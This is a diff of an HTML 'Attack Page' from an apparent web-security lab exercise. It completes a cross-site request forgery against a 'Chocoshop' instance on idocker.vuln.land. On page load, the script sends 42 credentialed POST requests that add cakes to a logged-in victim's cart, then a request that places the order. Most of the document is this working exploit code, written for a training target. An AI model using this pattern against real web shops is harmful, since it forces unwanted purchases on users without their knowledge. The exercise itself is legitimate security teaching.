@@ -1,53 +1,60 @@
 <html>
-<body>
-    <h1>CSRF Attack Page</h1>
-
+  <head>
+    <title>Attack Page</title>
+  </head>
+  <body>
+    <h1>Attack Page</h1>
+    <!-- ADD YOUR ATTACK HERE -->
     <script>
+      /* Use the UUID from your current lab instance */
+      const UUID = "003e55f4-b936-46d4-b523-7db6389ab076";
 
-        /* CHANGEME: Use the UUID from your current lab instance */
-        const UUID = "8edf0c90-f10f-4421-8aef-14b143c0d4d2";
-        
-        /* Execute the entire attack */
-        attack()
+      /* Execute the entire attack */
+      attack();
 
-        /* Function attack that calls two other functions to issue the requests */
-        async function attack() {
-            await add_cakes_to_cart(42);
-            await complete_order();
+      /* Function attack that calls two other functions to issue the requests */
+      async function attack() {
+        await add_cakes_to_cart(42);
+        await complete_order();
+      }
+
+      /* Adds n Choco cakes to the shopping cart */
+      async function add_cakes_to_cart(n) {
+        const orderAddAPI =
+          "https://" + UUID + ".idocker.vuln.land/api/add_cart";
+        const data = {
+          name: "Choco",
+          price: 17,
+          pid: 1,
+        };
+
+        for (i = 0; i < n; ++i) {
+          try {
+            /* Add one cake to shopping cart */
+            const r = await fetch(orderAddAPI, {
+              method: "POST",
+              credentials: "include",
+              headers: { "Content-Type": "text/plain" },
+              body: JSON.stringify(data),
+            });
+          } catch (error) {}
         }
+      }
 
-        /* Adds n Choco cakes to the shopping cart */
-        async function add_cakes_to_cart(n) {
-
-            const url = "https://" + UUID + ".idocker.vuln.land/api/add_cart";
-            const data = {
-                    "name": "Choco",
-                    "price": 17,
-                    "pid":1
-            };
-
-            for ( i = 0; i < n; ++i ) {
-                try {
-                    /* Add one cake to shopping cart */
-                    const r = await fetch(url, {
-                        method: "POST",
-                        credentials: "include",
-                        headers: {"Content-Type": "text/plain"},
-                        body: JSON.stringify(data)
-                    });
-                } catch(error) {
-                }
-            }
-        }
-
-        /* Complete the order */
-        async function complete_order() {
-
-            /* IMPLEMENT; also, make sure to adapt UUID at the top so it corresponds to the Chocoshop instance */
-
-        }
-
+      /* Complete the order */
+      async function complete_order() {
+        /* IMPLEMENT; also, make sure to adapt UUID at the top so it corresponds to the Chocoshop instance */
+        const orderAPI = "https://" + UUID + ".idocker.vuln.land/api/order";
+        try {
+          /* Add one cake to shopping cart */
+          const r = await fetch(orderAPI, {
+            method: "POST",
+            credentials: "include",
+            headers: { "Content-Type": "text/plain" },
+            body: JSON.stringify({}),
+          });
+        } catch (error) {}
+      }
     </script>
-
-</body>
+  </body>
 </html>
